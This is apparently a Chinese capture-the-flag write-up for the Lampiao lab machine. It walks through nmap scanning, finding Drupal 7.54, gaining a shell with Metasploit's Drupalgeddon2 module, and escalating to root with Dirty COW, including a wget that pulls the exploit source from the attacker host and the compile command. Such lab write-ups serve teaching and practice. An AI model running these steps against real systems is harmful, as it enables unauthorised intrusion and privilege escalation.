
---
title: lampao靶场
datas: 2024.6.24
tags:
  - 靶场
categories: 靶场
keywords:
description: lampao
---
Lampao
## 信息收集
```kali 经典操作
┌──(kali㉿kali)-[~]
└─$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.159.129  netmask 255.255.255.0  broadcast 192.168.159.255
        inet6 fe80::20c:29ff:fe4d:c7ff  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:4d:c7:ff  txqueuelen 1000  (Ethernet)
        RX packets 1032607  bytes 1116865188 (1.0 GiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 399718  bytes 94273606 (89.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


┌──(kali㉿kali)-[~]
└─$ nmap -sS 192.168.159.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 22:34 CST
Nmap scan report for 192.168.159.1
Host is up (0.00029s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:50:56:C0:00:08 (VMware)

Nmap scan report for 192.168.159.2
Host is up (0.000084s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
53/tcp open  domain
MAC Address: 00:50:56:E1:64:0A (VMware)

Nmap scan report for 192.168.159.131
Host is up (0.00050s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:AB:2F:A2 (VMware)

Nmap scan report for 192.168.159.254
Host is up (0.00042s latency).
All 1000 scanned ports on 192.168.159.254 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 00:50:56:FC:B0:1B (VMware)

Nmap scan report for 192.168.159.129
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 256 IP addresses (5 hosts up) scanned in 11.89 seconds

┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.159.131
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 22:39 CST
Nmap scan report for 192.168.159.131
Host is up (0.0021s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1898/tcp open  cymtec-port
MAC Address: 00:0C:29:AB:2F:A2 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds


```
看到开放了22端口，80端口和1898端口
推测存在ssh，http，以及一个而后台登录的
![](https://pic.imgdb.cn/item/6679856ad9c307b7e9ab749e.png)

80端口访问一下发现没什么可以利用的

转手就是1898

一个看着很有年代感的东西
![](https://pic.imgdb.cn/item/66798de1d9c307b7e9c6b588.png)

```
LuizGonzaga-LampiaoFalou.mp3
```
看到一个mp3的文件，先记下来不知道有没有用

readmore打开发现是一个发展史

看着没什么了，扫描一下后台吧那就
![](https://pic.imgdb.cn/item/66798e00d9c307b7e9c74b36.png)
![](https://pic.imgdb.cn/item/66798df3d9c307b7e9c70175.png)

robots.txt开放，打开发现一堆东西

```发展史那页的链接
http://192.168.159.131:1898/?q=node/1
```
刚才看到我就想搞一搞这个，感觉可能存在sql

```
http://192.168.159.131:1898/?q=node/2
```
里面有一个
audio.m4a
qrc.png

audio.m4a下载下来播放以后说是

user:tiago


图片是一个二维码，扫了没什么用


看看扫面出来的其他的

发现一个

```
/CHANGELOG.txt
```
进去以后上来就是Drupal 7.54, 2017-02-01

OK版本号知道了

感觉可以用一首crew来爆密码，毕竟刚才已经给了账号，但我直接搜的Drupal 7.54的漏洞，看到一个2018的RCE

## 提权

提权用的是脏牛，简单介绍一下脏牛吧

### 脏牛提权
```
 脏牛漏洞的漏洞点位于 Linux 内核中的 "mm/madvise.c" 文件中。攻击者可以通过对某个可写的映射文件的 "madvise()" 系统调用进行操纵，从而触发内核中的一个缺陷。攻击者通过修改页表项和文件系统缓存，将映射文件的权限更改为 "可写"，并且将该文件映射到内存中。这样，攻击者可以在内存中修改文件的内容，并将多个进程的 Copy-On-Write 页面指向被修改的内存页，绕过 "Copy-On-Write" 的保护机制。

```

利用过程：
   - 攻击者首先找到一个可写的映射文件，通常是一个拥有 "suid" 或 "sgid" 权限的可执行文件。
   - 通过执行一段特制的代码，利用 "madvise()" 系统调用漏洞修改文件的权限。
   - 攻击者通过将修改后的文件映射到内存并修改其中的特定字段，来爆发该漏洞。
   - 当其他进程尝试对该映射文件执行写操作时，会将进程的 "Copy-On-Write" 页面指向被修改的内存页。
   - 最终，攻击者就能够在内核中执行具有 root 权限的恶意代码。


### 回归正题
```
msf6 > search drupal

Matching Modules
================

   #   Name                                                              Disclosure Date  Rank       Check  Description
   -   ----                                                              ---------------  ----       -----  -----------
   0   exploit/unix/webapp/drupal_coder_exec                             2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   1   exploit/unix/webapp/drupal_drupalgeddon2                          2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   2     \_ target: Automatic (PHP In-Memory)                            .                .          .      .
   3     \_ target: Automatic (PHP Dropper)                              .                .          .      .
   4     \_ target: Automatic (Unix In-Memory)                           .                .          .      .
   5     \_ target: Automatic (Linux Dropper)                            .                .          .      .
   6     \_ target: Drupal 7.x (PHP In-Memory)                           .                .          .      .
   7     \_ target: Drupal 7.x (PHP Dropper)                             .                .          .      .
   8     \_ target: Drupal 7.x (Unix In-Memory)                          .                .          .      .
   9     \_ target: Drupal 7.x (Linux Dropper)                           .                .          .      .
   10    \_ target: Drupal 8.x (PHP In-Memory)                           .                .          .      .
   11    \_ target: Drupal 8.x (PHP Dropper)                             .                .          .      .
   12    \_ target: Drupal 8.x (Unix In-Memory)                          .                .          .      .
   13    \_ target: Drupal 8.x (Linux Dropper)                           .                .          .      .
   14    \_ AKA: SA-CORE-2018-002                                        .                .          .      .
   15    \_ AKA: Drupalgeddon 2                                          .                .          .      .
   16  exploit/multi/http/drupal_drupageddon                             2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   17    \_ target: Drupal 7.0 - 7.31 (form-cache PHP injection method)  .                .          .      .
   18    \_ target: Drupal 7.0 - 7.31 (user-post PHP injection method)   .                .          .      .
   19  auxiliary/gather/drupal_openid_xxe                                2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   20  exploit/unix/webapp/drupal_restws_exec                            2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   21  exploit/unix/webapp/drupal_restws_unserialize                     2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   22    \_ target: PHP In-Memory                                        .                .          .      .
   23    \_ target: Unix In-Memory                                       .                .          .      .
   24  auxiliary/scanner/http/drupal_views_user_enum                     2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   25  exploit/unix/webapp/php_xmlrpc_eval                               2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution


Interact with a module by name or index. For example info 25, use 25 or use exploit/unix/webapp/php_xmlrpc_eval


```
![](https://pic.imgdb.cn/item/66798e13d9c307b7e9c79dad.png)
![](https://pic.imgdb.cn/item/66798e2fd9c307b7e9c7f853.png)
use 1一发入魂（所以为什么有的师傅说1不行
```
www-data权限

uname -a 看一眼系统，linux，用脏牛
```
msf搜一下有没有脚本
![](https://pic.imgdb.cn/item/66798e47d9c307b7e9c84427.png)
```
find / -name 40487.cpp
```
cp到~，然后开放5555端口，用Py启一个服务器

![](https://pic.imgdb.cn/item/66798e55d9c307b7e9c867d5.png)

```
wget http://192.168.159.129:5555/40847.cpp

g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil
```
直接G++提权
- -Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告
- -pedantic 允许发出ANSI/ISO C标准所列出的所有警告
- -O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高
- -std=c++11就是用按C++2011标准来编译的
- -pthread 在Linux中要用到多线程时，需要链接pthread库
- -o 40847 gcc生成的目标文件,名字为40847

看了眼过程是没问题的，但是结果好慢，我直接找了个wp截图的（hambugerhan师傅的，[链接](https://www.freebuf.com/articles/web/265340.html)）
![](https://pic.imgdb.cn/item/66798dded9c307b7e9c6af7f.png)
直接出了PASSWORD，SSH登录就是ROOT，直接find flag.txt就可以了
